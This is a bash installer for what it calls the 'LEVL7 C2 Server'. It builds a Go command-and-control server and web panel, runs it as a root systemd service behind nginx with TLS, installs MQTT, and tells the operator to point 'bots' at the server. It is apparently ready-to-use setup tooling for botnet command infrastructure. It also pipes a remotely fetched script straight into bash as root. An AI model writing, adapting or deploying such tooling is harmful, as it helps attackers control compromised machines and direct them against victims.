#!/bin/bash
set -euo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
log() { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
err() { echo -e "${RED}[-]${NC} $1"; exit 1; }

for arg in "$@"; do
  [ "$arg" = "--help" ] || [ "$arg" = "-h" ] && { echo "Usage: $0 [domain] [--nosys]"; echo "  --nosys  Skip systemd service setup (just build + configure)"; exit 0; }
done
[ $EUID -ne 0 ] && err "Run as root (sudo)."

NOSYS=false
POSITIONAL=()
while [[ $# -gt 0 ]]; do
  case "$1" in
    --nosys) NOSYS=true; shift ;;

    -*)
      err "Unknown flag: $1"
      ;;
    *)
      POSITIONAL+=("$1")
      shift
      ;;
  esac
done

DOMAIN="${POSITIONAL[0]:-}"
if [ -z "$DOMAIN" ]; then
  read -r -p "Enter domain (e.g. panel.yoursite.com): " DOMAIN
  [ -z "$DOMAIN" ] && err "Domain required."
fi

REPO_DIR="$(cd "$(dirname "$0")" && pwd)"
SERVER_PORT=8080
SERVICE_NAME="levl7-server"
SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"
NGINX_CONF="/etc/nginx/sites-available/${DOMAIN}"
NGINX_ENABLED="/etc/nginx/sites-enabled/${DOMAIN}"

# -- Pre-flight -----------------------------------------------------------
log "Installing for domain: $DOMAIN"
log "Repo dir: $REPO_DIR"

# -- Dependencies ---------------------------------------------------------
log "Installing system packages..."
apt-get update -qq
apt-get install -y -qq curl gnupg software-properties-common nginx certbot python3-certbot-nginx mosquitto mosquitto-clients

if ! command -v go &>/dev/null; then
  log "Installing Go..."
  wget -q https://go.dev/dl/go1.22.5.linux-amd64.tar.gz -O /tmp/go.tar.gz
  rm -rf /usr/local/go && tar -C /usr/local -xzf /tmp/go.tar.gz
  echo 'export PATH=$PATH:/usr/local/go/bin' > /etc/profile.d/go.sh
  export PATH=$PATH:/usr/local/go/bin
fi

if ! command -v node &>/dev/null; then
  log "Installing Node.js..."
  curl -fsSL https://deb.nodesource.com/setup_20.x | bash -
  apt-get install -y -qq nodejs
fi

# -- Build Go Server ------------------------------------------------------
log "Building Go server..."
cd "$REPO_DIR"
cd cnc && go build -o "$REPO_DIR/server" . && cd "$REPO_DIR"

# -- Build Frontend -------------------------------------------------------
log "Building frontend..."
npm ci --omit=optional
npm run build
log "Copying frontend to embed dir..."
rm -rf cnc/out && cp -r out cnc/out

# -- Rebuild with embedded frontend ---------------------------------------
log "Rebuilding Go server with embedded frontend..."
cd cnc && go build -o "$REPO_DIR/server" . && cd "$REPO_DIR"

# -- MQTT Setup (skip -- container compat) ---------------------------------
MQTT_PASS=""
warn "MQTT setup skipped (run 'mosquitto_passwd' manually if needed)"

# -- Systemd Service ------------------------------------------------------
if $NOSYS; then
  log "Skipping systemd service setup (--nosys). Run manually: $REPO_DIR/server -web $SERVER_PORT"
else
  log "Creating systemd service..."
  cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=LEVL7 C2 Server
After=network.target mosquitto.service
Wants=mosquitto.service

[Service]
Type=simple
User=root
WorkingDirectory=$REPO_DIR
ExecStart=$REPO_DIR/server -web $SERVER_PORT
Restart=always
RestartSec=5
LimitNOFILE=65536

[Install]
WantedBy=multi-user.target
EOF

  systemctl daemon-reload || warn "systemd not available"
  systemctl enable "$SERVICE_NAME" || warn "Could not enable service via systemd"
fi

# -- Nginx -----------------------------------------------------------------
log "Configuring nginx..."
mkdir -p /etc/nginx/snippets

cat > "$NGINX_CONF" <<'NGINXEOF'
server {
    listen 80;
    server_name DOMAIN_PLACEHOLDER;
    client_max_body_size 100M;

    location / {
        proxy_pass http://127.0.0.1:SERVER_PORT_PLACEHOLDER;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_read_timeout 86400;
    }

    location /ws {
        proxy_pass http://127.0.0.1:SERVER_PORT_PLACEHOLDER;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_read_timeout 86400;
    }
}
NGINXEOF

sed -i "s/DOMAIN_PLACEHOLDER/$DOMAIN/g; s/SERVER_PORT_PLACEHOLDER/$SERVER_PORT/g" "$NGINX_CONF"

ln -sf "$NGINX_CONF" "$NGINX_ENABLED"
rm -f /etc/nginx/sites-enabled/default

nginx -t || err "Nginx config test failed."

# -- SSL via Certbot -------------------------------------------------------
log "Obtaining SSL certificate..."
certbot --nginx -d "$DOMAIN" --non-interactive --agree-tos --email "admin@${DOMAIN}" --redirect || \
  warn "Certbot failed. You may need to run: certbot --nginx -d $DOMAIN"

# -- Start Services --------------------------------------------------------
SERVER_BIN="$REPO_DIR/server"
SERVER_LOG="$REPO_DIR/server.log"

# nginx: try systemd then direct
if command -v systemctl &>/dev/null && systemctl is-system-running &>/dev/null 2>&1; then
  systemctl restart nginx 2>/dev/null || systemctl start nginx 2>/dev/null || true
else
  nginx 2>/dev/null || true
fi

# Go server: try systemd then direct
if command -v systemctl &>/dev/null && systemctl is-system-running &>/dev/null 2>&1; then
  systemctl restart "$SERVICE_NAME" 2>/dev/null || systemctl start "$SERVICE_NAME" 2>/dev/null || true
fi

log "Starting Go server..."
nohup "$SERVER_BIN" -web "$SERVER_PORT" > "$SERVER_LOG" 2>&1 &
SERVER_PID=$!
sleep 1

if kill -0 "$SERVER_PID" 2>/dev/null && ss -tlnp 2>/dev/null | grep -q ":$SERVER_PORT "; then
  log "Server running (PID $SERVER_PID) on port $SERVER_PORT"
else
  warn "Server failed to start. Check $SERVER_LOG:"
  head -20 "$SERVER_LOG" 2>/dev/null | while IFS= read -r line; do warn "  $line"; done
  # Last resort: try running once more with output visible
  warn "Trying one more time with visible output..."
  "$SERVER_BIN" -web "$SERVER_PORT" &
  sleep 1
  ss -tlnp | grep -q ":$SERVER_PORT " && log "Server running on try #2" || err "Server won't start. Fix manually."
fi

log "--- Installation complete ---"
log "Domain: https://$DOMAIN"
log "MQTT password: $MQTT_PASS"
log ""
log "Save the MQTT password above. Update your bots to connect to this server."
